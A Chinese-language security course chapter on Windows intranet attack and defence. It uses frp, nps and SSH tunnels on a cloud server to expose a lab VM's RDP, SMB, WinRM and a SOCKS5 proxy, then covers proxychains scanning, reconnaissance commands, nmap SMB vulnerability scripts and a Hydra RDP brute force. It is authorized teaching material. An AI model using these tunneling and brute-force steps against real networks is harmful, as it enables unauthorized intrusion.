# 08.项目八 Windows内网安全

---

# 📌 课前回顾

本项目以项目一至项目七所建立的服务器搭建、安全加固与应用安全知识为基础，从"网络边界"视角切入内网安全攻防——当攻击者已经突破外网防线进入内网后，如何进行横向渗透，以及如何构建纵深防御体系阻止攻击扩散。

**回顾问题：**

1. 项目四中 IIS 网站的安全加固措施（日志审计、请求筛选、安全响应头、HTTPS）在内网环境中是否仍然必要？为什么？
2. 项目七中植入的各类后门（注册表、计划任务、WMI事件订阅）如果被攻击者用于内网横向移动后的持久化，安全运维人员应如何排查？
3. Windows 防火墙在项目一中被建议"实验时关闭"，在生产内网环境中应如何正确配置入站/出站规则以限制横向移动？
4. 项目六中域控制器的 NTDS.dit 数据库包含哪些敏感信息？攻击者获取后能造成什么危害？
5. 项目五中配置的远程桌面（RDP）和 WinRM 服务，在内网横向移动攻击中会被攻击者如何利用？

🔗

**知识衔接**：前序项目按"服务搭建 → 网站部署 → 安全加固 → 远程管理 → 域管理 → 应用安全"构成了完整的服务器运维链。本项目转换视角——购买一台真实的阿里云 ECS 服务器，在上面部署 frp 内网穿透服务端，将本地虚拟机上的内网服务（RDP、Web、WinRM 等）通过隧道暴露到公网。通过这个真实场景，学习攻击者如何利用内网穿透工具突破网络边界、实施横向移动，以及如何从网络层面构建纵深防御体系。

⚠️

**声明**：本项目内容仅用于授权环境下的安全教学与攻防演练。严禁对未经授权的系统实施任何渗透测试行为，违者将依法承担相应法律责任。

---

# 🎯 学习目标

| 层次 | 内容 |
| --- | --- |
| 知识 | 理解内网安全的基本概念与面临的威胁；理解内网穿透的工作机制与原理（反向代理、隧道转发）；掌握 frp 内网穿透工具的架构与配置方法；理解 SOCKS5 代理与 proxychains 的工作原理；掌握内网信息收集的方法与常用命令；理解 Pass-the-Hash 等横向移动技术的原理；掌握内网安全纵深防御策略 |
| 技能 | 能够在阿里云 ECS 上部署 frp 服务端（frps），配置安全组放行必要端口；能够在本地虚拟机上部署 frp 客户端（frpc），配置 TCP/HTTP/SOCKS5 隧道；能够使用 Nmap 通过 frp 隧道扫描内网服务；能够使用 Impacket/NetExec 工具进行横向移动；能够实施内网安全加固措施（SMB签名、Protected Users、防火墙规则等） |
| 素养 | 树立"边界突破不等于安全终结"的纵深防御意识；理解内网穿透工具在攻防演练中的双刃剑作用；强化法律意识，明确未授权网络渗透的法律后果；培养从攻击者视角审视内网安全防御的能力 |

---

# ⚠️ 重难点梳理

| 类型 | 内容 | 说明 |
| --- | --- | --- |
| 重点 | frp内网穿透的部署与配置 | 掌握在阿里云 ECS 上部署 frps 服务端（TOML 配置），在本地虚拟机上部署 frpc 客户端，配置 TCP/SOCKS5 隧道 |
| 重点 | 阿里云安全组配置 | 掌握 ECS 安全组规则的配置方法，理解入站/出站规则对 frp 通信的影响 |
| 重点 | 内网信息收集的方法体系 | 掌握 Windows 内置命令（ipconfig/arp/netstat/net view）和 Nmap 扫描的组合使用 |
| 重点 | 内网横向移动技术 | 理解 Pass-the-Hash 的原理，掌握 Impacket 工具族的使用 |
| 难点 | SOCKS5代理与proxychains | 理解 frp SOCKS5 代理如何将攻击流量转发到内网，以及 proxychains 如何让任意工具通过代理工作 |
| 难点 | 内网攻击链的完整理解 | 从初始访问 → 信息收集 → 凭据获取 → 横向移动 → 域控攻陷 → 持久化的完整攻击链路 |
| 难点 | 内网安全防御体系设计 | 理解网络分段、零信任、Tier管理模型等防御理念如何在实际环境中落地 |

---

# 任务一 内网安全基础与frp内网穿透

## 🧠 理论知识

### 内网安全概述

**内网（Intranet）** 是企业/组织内部使用的专用网络，使用私有 IP 地址（如 192.168.x.x、10.x.x.x），与互联网通过防火墙或路由器隔离。

**内网安全面临的威胁**：

- 外部攻击者突破边界后的横向移动
- 内部人员的恶意操作或误操作
- 受感染的终端作为"跳板"传播攻击
- 供应链攻击植入的恶意软件

**典型内网攻击流程（ATT&CK框架）**：

```
初始访问 → 执行 → 持久化 → 权限提升 → 防御规避 → 凭证访问 → 发现 → 横向移动 → 收集 → 渗漏
```

> 💡 **传统安全误区**：很多企业认为"内网 = 安全"，将安全预算集中在外网防护上。事实上，攻击者突破边界后，内网往往缺乏有效防护——主机间互信、缺乏网络分段、弱密码普遍，使得横向移动畅通无阻。

---

### 内网穿透的概念与原理

**内网穿透**（Intranet Penetration / NAT Traversal）是指在无法直接访问内网主机的情况下，通过中间代理或隧道技术建立从外网到内网的通信通道。

**为什么需要内网穿透？**

```
典型企业网络架构：

  互联网用户                     企业内网
  (无法直接访问内网)              192.168.x.x
       │                           │
       │    ┌─────────────────┐    │
       └───►│   防火墙/NAT     │◄───┘
            │   仅允许出站连接  │
            └─────────────────┘

问题：
  ✗ 内网主机没有公网IP
  ✗ 防火墙仅允许内网主动向外发起连接
  ✗ 外部无法主动连接到内网主机

解决方案——内网穿透：
  内网主机 主动向外 建立一条隧道
  外部通过这条隧道 反向访问 内网服务
```

**正向代理与反向代理**：

```
正向代理（Forward Proxy）——代理客户端：
  客户端 ──→ 代理服务器 ──→ 目标服务器
  用途：绕过访问限制、隐藏客户端身份

反向代理（Reverse Proxy）——代理服务器：
  客户端 ──→ 代理服务器 ──→ 后端服务器
  用途：负载均衡、CDN、隐藏服务器身份

内网穿透 = 反向代理的一种特殊应用：
  攻击机 ──→ 公网代理服务器 ←──(内网主机主动建立隧道)── 内网主机
  内网主机主动出站建立连接，攻击机通过同一条连接反向访问内网
```

> 💡 **核心原理**：内网穿透之所以能工作，是因为企业防火墙通常**不阻止出站连接**。内网主机主动连出去是允许的，而 frp 等工具正是利用这条出站通道建立了双向通信隧道。

---

### frp 内网穿透工具

**frp（Fast Reverse Proxy）** 是一个高性能的反向代理应用，专注于内网穿透。

```
frp 架构与工作流程：

  ┌────────────┐          ┌────────────────┐         ┌────────────┐
  │   攻击机   │          │  阿里云 ECS     │         │  内网主机   │
  │   Kali     │          │  frps 服务端    │         │  SRV02     │
  │            │          │  公网IP: EIP    │         │  frpc 客户端│
  │            │          │                 │         │            │
  │  访问      │    ②     │  接收请求        │   ③    │  提供服务   │
  │  :10001───┼─────────►│  转发给frpc     ├────────►│  RDP(3389) │
  │            │          │                 │         │  Web(80)   │
  │            │          │                 │   ①    │            │
  │            │          │◄────────────────┼─────────│  主动连接   │
  │            │          │  建立控制隧道    │         │  frps:7000 │
  └────────────┘          └────────────────┘         └────────────┘

  步骤：
  ① frpc（内网主机）主动连接 frps（阿里云ECS）的7000端口，建立控制隧道
  ② 攻击机访问 ECS 的映射端口（如10001）
  ③ frps 通过隧道将流量转发给 frpc，frpc 再转给本地服务
```

**frp 支持的隧道类型**：

| 隧道类型 | 说明 | 适用场景 |
| --- | --- | --- |
| **TCP** | 端口到端口的直接映射 | RDP、SSH、MySQL等TCP服务 |
| **UDP** | UDP端口映射 | DNS、VoIP等UDP服务 |
| **HTTP** | 基于域名的HTTP代理 | Web服务（支持虚拟主机） |
| **HTTPS** | HTTPS代理 | 安全Web服务 |
| **STCP** | 安全TCP（需密钥认证） | 需要身份验证的隧道 |
| **XTCP** | 点对点穿透 | P2P直连（减少中转流量） |

### 其他内网穿透工具对比

| 工具 | 语言 | 特点 | Web管理 | 适用场景 |
| --- | --- | --- | --- | --- |
| **frp** | Go | 高性能，配置灵活，社区活跃 | 有Dashboard | 通用内网穿透 |
| **nps** | Go | Web管理界面，操作简便 | 有（主要特点） | 可视化管理场景 |
| **Chisel** | Go | 基于HTTP/SSH协议，穿越Web代理 | 无 | 穿越严格防火墙 |
| **rathole** | Rust | 高性能，类似frp的替代品 | 无 | 高性能场景 |
| **ngrok** | — | 商业服务，注册即可使用 | 有 | 快速演示（需注册） |
| **SSH隧道** | — | 利用SSH协议，无需额外安装 | 无 | 临时端口转发 |

> 💡 **课堂选择建议**：frp 是目前最主流的开源内网穿透工具，配置简单且功能全面。nps 提供 Web 管理界面更直观，适合辅助演示。

---

## 🛠️ 实践操作

### 实验环境总体说明

> 本项目使用 **阿里云 ECS** 作为公网穿透服务器，配合**本地虚拟机**模拟内网主机，通过 frp 实现真实的内网穿透。
>
> **实验架构**：
>
> | 设备 | 角色 | 运行位置 | 操作系统 |
> | --- | --- | --- | --- |
> | **阿里云 ECS** | 公网穿透服务器（frps） | 阿里云 | Ubuntu 22.04 |
> | **SRV02** | 内网主机（frpc） | 本地 VMware/VirtualBox | Windows Server 2022 |
> | **Kali Linux** | 攻击机 | 本地 VMware/VirtualBox | Kali Linux 2024+ |
>
> **预估费用**：ECS 按量付费约 ¥3-8（实验 3-4 小时）。**实验结束后务必释放 ECS 实例和弹性公网 IP，避免持续扣费。**
>
> ⚠️ **配置要求**：
> - ECS 需要分配**弹性公网 IP（EIP）**，安全组需放行 frp 相关端口
> - SRV02 为本地虚拟机，NAT 模式（需能访问互联网以连接 ECS 的 frps）
> - Kali 为本地虚拟机，需能访问互联网（连接 ECS 的 frp 映射端口）

---

### 实验1：阿里云服务器购买与frp服务端部署

> **实验目标**：购买阿里云 ECS 服务器，配置安全组，部署 frp 服务端（frps）。

**第一步：购买阿里云 ECS 服务器**

1. 访问阿里云官网，注册并登录账号
2. 进入 **云服务器 ECS** 控制台，点击"创建实例"
3. 配置如下：

| 配置项 | 推荐选择 |
| --- | --- |
| **计费方式** | 按量付费（实验用完即释放） |
| **地域** | 离你最近的区域（如华东1-杭州） |
| **实例规格** | ecs.t6-c1m2.large（2 vCPU / 4 GB）或更低规格 |
| **镜像** | Ubuntu 22.04 64位 |
| **系统盘** | 40 GB 高效云盘 |
| **网络** | 专有网络 VPC（使用默认） |
| **公网IP** | 选择"分配公网 IPv4 地址"（按使用流量计费） |
| **登录凭证** | 设置 root 密码 |

4. 创建完成后，在实例列表中记录 **公网 IP 地址**（后续以 `<ECS公网IP>` 表示）

> ⚠️ **费用提醒**：按量付费实验 3-4 小时约 ¥3-8。**实验结束后务必释放 ECS 实例和弹性公网 IP！**

**第二步：配置安全组**

安全组是阿里云 ECS 的虚拟防火墙，控制哪些端口可以从外部访问。

1. ECS 控制台 → 安全组 → 配置规则
2. 添加以下**入方向**规则：

| 协议类型 | 端口范围 | 授权对象 | 用途 |
| --- | --- | --- | --- |
| TCP | 22 | 0.0.0.0/0 | SSH 远程管理 |
| TCP | 7000 | 0.0.0.0/0 | frp 客户端连接端口 |
| TCP | 7500 | 0.0.0.0/0 | frp Dashboard 管理面板 |
| TCP | 10000-20000 | 0.0.0.0/0 | frp 隧道映射端口范围 |
| ICMP | -1/-1 | 0.0.0.0/0 | ping 测试 |

> 💡 **安全组说明**：阿里云安全组默认拒绝所有入站流量，必须手动添加允许规则。`0.0.0.0/0` 表示允许所有来源，实验环境可用；生产环境应限制为特定 IP。

**第三步：SSH 连接 ECS 并安装 frp**

```bash
# 在本地电脑上 SSH 连接 ECS
ssh root@<ECS公网IP>

# 更新系统
apt update && apt upgrade -y

# 下载 frp（访问 https://github.com/fatedier/frp/releases 获取最新版本号）
cd /opt
wget https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_linux_amd64.tar.gz
tar -xzf frp_0.61.1_linux_amd64.tar.gz
mv frp_0.61.1_linux_amd64 frp
cd frp

# 验证文件
ls frps frps.toml
# frps —— 服务端可执行文件
# frps.toml —— 服务端配置文件
```

**第四步：配置并启动 frps**

```bash
# 编辑服务端配置
cat > /opt/frp/frps.toml << 'EOF'
bindPort = 7000

webServer.addr = "0.0.0.0"
webServer.port = 7500
webServer.user = "admin"
webServer.password = "admin123"

auth.method = "token"
auth.token = "ClassDemo2025"

log.to = "./frps.log"
log.level = "info"
log.maxDays = 7

allowPorts = [
  { start = 10000, end = 20000 }
]
EOF

# 启动 frps
/opt/frp/frps -c /opt/frp/frps.toml

# 预期输出：
# [I] frps tcp listen on 0.0.0.0:7000
# [I] http service listen on 0.0.0.0:7500
# [I] frps started successfully
```

```bash
# 后台运行（按 Ctrl+Z 暂停后执行）
bg
disown

# 验证监听端口
ss -tlnp | grep -E "7000|7500"
# 预期：7000 和 7500 端口均在监听
```

**第五步：访问 frp Dashboard**

在本地浏览器中打开 `http://<ECS公网IP>:7500`，用户名 `admin`，密码 `admin123`。预期显示 frp Dashboard 页面（此时无客户端连接）。

---

### 实验2：本地虚拟机配置与frp客户端部署

> **实验目标**：在本地 Windows Server 虚拟机上启用服务、部署 frp 客户端，通过隧道将服务暴露出去。

**第一步：准备 SRV02 虚拟机**

SRV02 是运行在本地 VMware/VirtualBox 中的 Windows Server 虚拟机，模拟企业内网中的服务器。网络模式使用 NAT（需要能访问互联网以连接阿里云 ECS）。

**第二步：启用基础服务**

```powershell
# 在 SRV02 上以管理员身份运行 PowerShell

# 1. 启用远程桌面
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# 2. 启用 WinRM（远程管理）
Enable-PSRemoting -Force

# 3. 安装 IIS Web 服务器
Install-WindowsFeature -Name Web-Server -IncludeManagementTools

# 4. 创建测试页面
Set-Content -Path "C:\inetpub\wwwroot\index.html" -Value "<html><body><h1>SRV02 内网服务器</h1><p>frp 隧道穿透成功！</p></body></html>"

# 5. 关闭防火墙（仅实验环境）
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# 6. 验证本地服务
curl http://localhost
```

**第三步：下载并配置 frpc**

```powershell
# 在 SRV02 上下载 Windows 版 frp
cd C:\
Invoke-WebRequest -Uri "https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_windows_amd64.zip" -OutFile "frp.zip"
Expand-Archive -Path "frp.zip" -DestinationPath "C:\frp" -Force

# 编辑客户端配置
notepad C:\frp\frpc.toml
```

写入以下内容（**将 `<ECS公网IP>` 替换为你的 ECS 实际公网 IP**）：

```toml
serverAddr = "<ECS公网IP>"
serverPort = 7000

auth.method = "token"
auth.token = "ClassDemo2025"

log.to = "./frpc.log"
log.level = "info"

# RDP映射：外部访问 <ECS公网IP>:10001 → SRV02 的 3389
[[proxies]]
name = "rdp"
type = "tcp"
localIP = "127.0.0.1"
localPort = 3389
remotePort = 10001

# Web映射：外部访问 <ECS公网IP>:10002 → SRV02 的 80
[[proxies]]
name = "web"
type = "tcp"
localIP = "127.0.0.1"
localPort = 80
remotePort = 10002

# WinRM映射：外部访问 <ECS公网IP>:10003 → SRV02 的 5985
[[proxies]]
name = "winrm"
type = "tcp"
localIP = "127.0.0.1"
localPort = 5985
remotePort = 10003

# SMB映射：外部访问 <ECS公网IP>:10004 → SRV02 的 445
[[proxies]]
name = "smb"
type = "tcp"
localIP = "127.0.0.1"
localPort = 445
remotePort = 10004

# SOCKS5代理：通过隧道访问SRV02本地网络
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 10080
[proxies.plugin]
type = "socks5"
```

**第四步：启动 frpc**

```powershell
# 启动 frp 客户端
C:\frp\frpc.exe -c C:\frp\frpc.toml

# 预期输出：
# [I] login to server success
# [I] proxy added: [rdp web winrm smb socks5]
# [I] [rdp] start proxy success
# [I] [web] start proxy success
# ...
```

> ⚠️ **如果连接失败**：检查（1）阿里云安全组是否放行 7000 端口；（2）frpc.toml 中 IP 和 token 是否正确；（3）SRV02 是否能 ping 通 ECS。

---

### 实验3：验证 frp 隧道穿透效果

> **实验目标**：验证 frp 隧道是否成功将 SRV02 的内网服务暴露到公网。

**第一步：查看 frp Dashboard**

浏览器打开 `http://<ECS公网IP>:7500`，刷新页面，应看到 5 条隧道全部在线。

**第二步：验证各隧道端口**

```bash
# 在 Kali 上执行
nmap -p 10001,10002,10003,10004 <ECS公网IP>

# 预期：四个端口全部 open
```

**第三步：验证 Web 穿透**

```bash
curl http://<ECS公网IP>:10002
# 预期：返回 "SRV02 内网服务器 - frp 隧道穿透成功！"
```

**第四步：验证 RDP 穿透**

```bash
# Kali 上通过 frp 隧道连接 SRV02 远程桌面
xfreerdp /v:<ECS公网IP> /port:10001 /u:administrator /p:'P@ssw0rd' /cert:ignore
```

或在 Windows 宿主机上打开"远程桌面连接"（mstsc），计算机填 `<ECS公网IP>:10001`。

> ⚠️ **关键理解**：
> - SRV02 在本地内网中，没有公网 IP，但通过 frp 隧道，任何人都可以通过阿里云 ECS 的公网 IP 访问 SRV02 的服务
> - frpc 只需一条**出站连接**（到 ECS:7000），即可将所有内网服务暴露出去
> - 企业防火墙通常不阻止出站连接，这正是内网穿透工具能工作的根本原因

---

## 📝 任务一知识点总结

| 知识点 | 要点 |
| --- | --- |
| 内网安全威胁 | 边界突破后的横向移动、内部人员恶意操作、受感染终端传播 |
| 内网穿透原理 | 内网主机主动连接公网服务器建立隧道，外部通过隧道反向访问内网 |
| 反向代理 | 内网穿透是反向代理的特殊应用——代理服务器替内网主机接收外部请求并转发 |
| frp架构 | frps（服务端，部署在阿里云ECS）+ frpc（客户端，运行在内网主机） |
| frp隧道类型 | TCP（端口映射）、HTTP/HTTPS（域名代理）、SOCKS5（全网段代理） |
| 阿里云安全组 | ECS 的虚拟防火墙，控制入站/出站流量，默认拒绝所有入站 |
| 出站连接 | frp 能工作的根本原因：防火墙通常允许内网主机主动出站 |

---

# 任务二 内网穿透进阶

## 🧠 理论知识

### SOCKS5 代理与 proxychains

上面的实验中，frp 将 SRV02 的每个服务端口逐一映射到 ECS 上（TCP 隧道）。但 frp 还有一种更强大的模式——**SOCKS5 代理**：只需一条隧道，就可以让攻击机的**所有网络流量**通过 SRV02 转发，就像攻击机直接处于 SRV02 的内网中一样。

```
TCP隧道模式（逐一映射）：
  Kali → ECS:10001 → SRV02:3389（RDP）
  Kali → ECS:10002 → SRV02:80   （Web）
  Kali → ECS:10003 → SRV02:5985 （WinRM）
  缺点：每暴露一个服务就要加一条配置

SOCKS5代理模式（一键穿透）：
  Kali → ECS:10080 → SRV02（SOCKS5服务）→ SRV02可访问的任何地址:任何端口
  优点：一条隧道即可访问 SRV02 所在网络中的所有服务
```

**proxychains** 是 Linux 下的代理链工具，可以强制让任何程序的网络流量通过 SOCKS5 代理转发。配合 frp 的 SOCKS5 隧道，几乎所有网络工具（nmap、hydra、curl 等）都可以通过隧道工作。

---

## 🛠️ 实践操作

### 实验4：SOCKS5 代理与 proxychains 进阶

> ⚠️ **前置条件**：完成实验1-3，frp 隧道已建立，SOCKS5 隧道端口 10080 可用。

**第一步：确认 SOCKS5 代理可用**

```bash
nmap -p 10080 <ECS公网IP>
# 预期：10080/tcp open
```

**第二步：配置 proxychains**

```bash
# 编辑 proxychains 配置
sudo nano /etc/proxychains4.conf

# 在文件末尾 [ProxyList] 部分替换为：
# [ProxyList]
# socks5 <ECS公网IP> 10080
```

**第三步：通过 SOCKS5 代理访问 SRV02**

```bash
# 通过代理访问 SRV02 的 Web 服务
proxychains curl http://127.0.0.1
# 预期：返回 SRV02 的 IIS 页面（SOCKS5 代理从 SRV02 本地发起连接，127.0.0.1 就是 SRV02）

# 通过代理扫描 SRV02 的端口
proxychains nmap -sT -p 21,80,135,139,445,3389,5985 127.0.0.1
# 预期：80、135、139、445、3389、5985 端口 open
```

> 💡 **为什么用 127.0.0.1？**：SOCKS5 代理的连接是从 frpc（SRV02）本地发起的。当 proxychains 把请求发给 SOCKS5 代理时，代理在 SRV02 上向 127.0.0.1 发起连接——即 SRV02 自身。

**第四步：浏览器通过 SOCKS5 代理**

```
Firefox 设置方法：
1. 设置 → 常规 → 网络设置 → 手动代理配置
2. SOCKS 主机：<ECS公网IP>  端口：10080  选择 SOCKS v5
3. 勾选"代理 DNS 时使用 SOCKS v5"

访问 http://127.0.0.1
预期：显示 SRV02 的 IIS 页面
```

> ⚠️ **proxychains 下的 nmap 限制**：只能用 `-sT`（TCP Connect）扫描，不能用 `-sS`（SYN扫描）；不能用 ICMP ping；速度较慢。

> 💡 **真实内网场景**：在真实渗透中，SRV02 通常处于包含多台主机的企业内网中。通过 SOCKS5 代理，攻击者可扫描整个内网网段，发现更多目标。这正是攻击者突破单台主机后扩展战果的核心手段。

---

### 实验5：nps 内网穿透（Web管理界面）

> ⚠️ **前置条件**：完成实验1-3。本实验作为 frp 的补充对比。

**第一步：在 ECS 上安装 nps 服务端**

```bash
# 在 ECS 上执行
cd /opt
wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
mkdir nps && tar -xzf linux_amd64_server.tar.gz -C nps
cd nps
```

**第二步：配置并启动 nps**

```bash
# 编辑配置
nano conf/nps.conf
```

确认关键配置：

```ini
web_port=8080
web_username=admin
web_password=admin123
bridge_port=8024
bridge_type=tcp
```

> ⚠️ **安全组提醒**：需放行 8080（Web管理）和 8024（客户端连接）端口。

```bash
# 启动 nps
./nps
# 预期：nps start successfully
```

**第三步：通过 Web 界面添加客户端和隧道**

1. 浏览器访问 `http://<ECS公网IP>:8080`，登录 admin/admin123
2. 客户端 → 新增 → 备注名 `SRV02`，验证密钥 `npstest2025` → 保存
3. 点击 SRV02 旁的"隧道"→ 新增 TCP 隧道：服务端端口 10001，目标 `127.0.0.1:3389`

**第四步：在 SRV02 上运行 nps 客户端**

```powershell
# 在 SRV02 上下载并启动 npc
Invoke-WebRequest -Uri "https://github.com/ehang-io/nps/releases/download/v0.26.10/windows_amd64_client.tar.gz" -OutFile "C:\npc.tar.gz"
# 解压后运行：
C:\npc\npc.exe -server=<ECS公网IP>:8024 -vkey=npstest2025
```

**第五步：验证**

```bash
nmap -p 10001 <ECS公网IP>
# 预期：10001/tcp open
```

> 💡 **nps vs frp**：nps 有 Web 管理界面，操作直观；frp 性能更高、配置更灵活、社区更活跃。课堂以 frp 为主，nps 作为补充。

---

### 实验6：SSH 隧道内网穿透

> SSH 隧道无需安装额外工具，适合临时使用。

**SSH隧道类型**：

```
1. 远程端口转发（-R）——最适合内网穿透：
   SRV02 主动 SSH 连接到 ECS，将自己的端口暴露到 ECS 上

2. 本地端口转发（-L）：
   Kali 通过 SSH 连接到 ECS，将 ECS 可达的端口映射到本地

3. 动态端口转发（-D）：
   通过 SSH 创建 SOCKS5 代理
```

**远程端口转发（推荐）**：

```powershell
# 在 SRV02 上执行：将本地 RDP 暴露到 ECS 的 13389 端口
ssh -R 13389:127.0.0.1:3389 root@<ECS公网IP> -N -f
```

```bash
# 在 Kali 上验证
nmap -p 13389 <ECS公网IP>
# 预期：13389/tcp open

xfreerdp /v:<ECS公网IP> /port:13389 /u:administrator /p:'P@ssw0rd' /cert:ignore
```

**动态端口转发（SOCKS5）**：

```bash
# 在 Kali 上通过 ECS 创建 SOCKS5 代理
ssh -D 1080 root@<ECS公网IP> -N -f

# proxychains 配置：socks5 127.0.0.1 1080
proxychains curl http://127.0.0.1:10002
```

> 💡 **SSH 隧道 vs frp**：SSH 隧道不需要额外安装工具，适合临时使用；frp 更适合持久化穿透（可注册为服务、支持断线重连、有 Dashboard）。

---

## 📝 任务二知识点总结

| 知识点 | 要点 |
| --- | --- |
| SOCKS5代理 | 一条隧道即可访问目标主机所在网络的所有服务，无需逐一配置端口映射 |
| proxychains | 强制让任意程序的网络流量通过 SOCKS5 代理转发 |
| nps | 提供Web管理界面的内网穿透工具，操作直观，适合新手 |
| SSH隧道 | -R远程转发（暴露本地端口）、-D动态转发（SOCKS5代理），无需额外安装 |
| proxychains限制 | 只能用-sT扫描，速度慢，无法使用ICMP和SYN扫描 |

---

# 任务三 内网信息收集

## 🧠 理论知识

内网信息收集是渗透测试的关键阶段。攻击者在获取内网初始访问后，需要全面了解网络拓扑、主机信息、用户账户等，才能规划横向移动路径。

**信息收集的层次**：

```
第一层：本机信息
├── 网络配置（IP、网关、DNS）        ipconfig /all, route print
├── 系统信息（OS版本、补丁）          systeminfo
├── 用户和组信息                      whoami /all, net user
├── 进程和服务                        tasklist /svc
└── 安全软件状态

第二层：网络邻居
├── ARP缓存（同网段主机）             arp -a
├── NetBIOS广播                      net view
├── 网络共享资源                      net share
└── 域信息                            net group /domain

第三层：主动扫描
├── Nmap端口扫描
├── 服务版本探测
└── 协议枚举（SMB/LDAP/Kerberos）
```

---

## 🛠️ 实践操作

### 实验7：Windows 内网信息收集（在 SRV02 上执行）

> **操作方式**：本实验同时提供图形界面和命令行两种方式。

**第一步：本机网络信息收集**

```powershell
# 查看完整网络配置
ipconfig /all
# 关键信息：IPv4 地址、默认网关、DNS 服务器

# 查看路由表
route print
# 关键信息：本地网段范围，是否存在多网段

# 查看 ARP 缓存（发现同网段主机）
arp -a
# 关键信息：已通信主机的 IP 和 MAC 地址

# 查看活跃网络连接
netstat -an | findstr "ESTABLISHED"
# 关键信息：正在通信的主机和端口

# 查看 DNS 缓存
ipconfig /displaydns | findstr "Record"
# 关键信息：最近访问过的域名
```

**图形界面方式**：`Win+R` → `ncpa.cpl` → 右键网卡 → 状态 → 详细信息。

**第二步：用户、组和系统信息收集**

```powershell
# 当前用户信息（权限、组成员、SID）
whoami /all

# 本地用户列表
net user

# 本地管理员组成员
net localgroup administrators

# 系统信息（OS版本、补丁列表）
systeminfo

# 已安装补丁（攻击者用此判断未修复的漏洞）
wmic qfe list full

# 计算机名和域名
hostname
echo %USERDOMAIN%
```

**第三步：网络邻居和共享资源收集**

```powershell
# 查看网络上的计算机（NetBIOS广播）
net view

# 查看本机共享资源
net share
# 预期：C$、ADMIN$、IPC$ 等默认共享

# 查看远程主机的共享
net view \\<其他主机IP>

# 查看运行的服务
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, StartType

# 查看进程列表（发现安全软件如 MsMpEng.exe = Windows Defender）
Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize
```

---

### 实验8：Nmap 内网扫描（通过 frp 隧道从 Kali 执行）

> ⚠️ **前置条件**：完成实验1-4，SOCKS5 代理可用。

**第一步：通过 SOCKS5 代理扫描 SRV02**

```bash
# 确认 proxychains 配置：socks5 <ECS公网IP> 10080

# 扫描 SRV02 端口（127.0.0.1 因为 SOCKS5 从 SRV02 本地发起连接）
proxychains nmap -sT -p 21,22,80,135,139,445,3389,5985 127.0.0.1

# 预期输出：
# PORT     STATE  SERVICE
# 80/tcp   open   http
# 135/tcp  open   msrpc
# 445/tcp  open   microsoft-ds
# 3389/tcp open   ms-wbt-server
# 5985/tcp open   wsman
```

**第二步：直接扫描 frp 映射端口（更快）**

```bash
# 不经过 SOCKS5，直接扫描 ECS 上的映射端口
nmap -sV -p 10001,10002,10003,10004 <ECS公网IP>

# 预期：能看到各映射端口对应的服务版本
```

**第三步：SMB 扫描**

```bash
# 通过代理扫描 SMB 漏洞
proxychains nmap -sT --script smb-vuln* -p 445 127.0.0.1

# 通过代理枚举 SMB 共享和用户
proxychains nmap -sT --script smb-enum-shares,smb-enum-users -p 445 127.0.0.1
```

---

## 📝 任务三知识点总结

| 知识点 | 要点 |
| --- | --- |
| 信息收集层次 | 本机信息→网络邻居→主动扫描，由近及远逐步扩展 |
| 本机网络信息 | `ipconfig /all`、`arp -a`、`route print`、`netstat -an` |
| 用户组信息 | `whoami /all`、`net user`、`net localgroup administrators` |
| 共享资源枚举 | `net share`（本机）、`net view \\主机`（远程主机） |
| 两种扫描方式 | proxychains + SOCKS5（全能但慢）vs 直接扫 frp 映射端口（快但只扫已知端口） |
| 攻击者视角 | 信息收集的目的是发现可攻击的面和横向移动的路径 |

---

# 任务四 内网渗透实战

## 🧠 理论知识

### 网络攻击一般流程

**经典攻击流程**（Cyber Kill Chain）：

| 阶段 | 说明 | 对应MITRE ATT&CK |
| --- | --- | --- |
| **踩点** | 收集目标信息（IP、域名、员工信息） | TA0043 侦察 |
| **扫描** | 扫描开放端口、服务版本、漏洞 | TA0007 发现 |
| **查点** | 枚举用户、共享、服务详情 | TA0007 发现 |
| **入侵** | 利用漏洞或弱口令获取初始访问 | TA0001 初始访问 |
| **提权** | 从普通用户提升为管理员/SYSTEM | TA0004 权限提升 |
| **持久化** | 安装后门保持访问 | TA0003 持久化 |
| **掩盖踪迹** | 清理日志、删除工具痕迹 | TA0005 防御规避 |

### Pass-the-Hash（哈希传递攻击）

**Pass-the-Hash（PtH）** 是内网横向移动最常用的技术。攻击者无需明文密码，仅凭 NTLM 哈希即可完成身份认证。

```
正常认证：用户输入密码 → 计算NTLM Hash → 与存储的Hash比对 → 通过
PtH攻击：攻击者直接用Hash构造认证请求 → 与存储的Hash比对 → 通过

根本原因：NTLM协议只验证"是否拥有正确的Hash"，不验证"是否知道密码"
         → Hash在认证中与密码等价
```

### 横向移动常用工具

| 工具 | 协议 | 特点 |
| --- | --- | --- |
| **impacket-psexec** | SMB(445) | 上传服务并执行，返回 SYSTEM Shell |
| **impacket-wmiexec** | WMI(135) | 远程执行命令，无文件落地 |
| **evil-winrm** | WinRM(5985) | 交互式 Shell，支持文件上传 |
| **NetExec（nxc）** | SMB/LDAP/WinRM | 批量验证、枚举和远程执行 |

---

## 🛠️ 实践操作

### 实验9：弱口令攻击

> ⚠️ **前置条件**：frp 隧道已建立，RDP 映射端口 10001 可用。

**前置准备——在 SRV02 上创建弱口令账户**：

```powershell
# 在 SRV02 上以管理员身份运行
net user testuser P@ssw0rd /add
net user admin123 123456 /add
net localgroup administrators admin123 /add

Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

**第一步：使用 Hydra 暴力破解 RDP**

```bash
# 在 Kali 上创建字典
cat > /tmp/users.txt << 'EOF'
administrator
testuser
admin123
EOF

cat > /tmp/passwords.txt << 'EOF'
123456
password
P@ssw0rd
admin
admin123
qwerty
EOF

# 通过 frp 隧道暴力破解
hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://<ECS公网IP> -s 10001 -t 4

# 预期输出：
# [3389][rdp] host: <ECS公网IP>   login: admin123   password: 123456
# [3389][rdp] host: <ECS公网IP>   login: testuser   password: P@ssw0rd
```

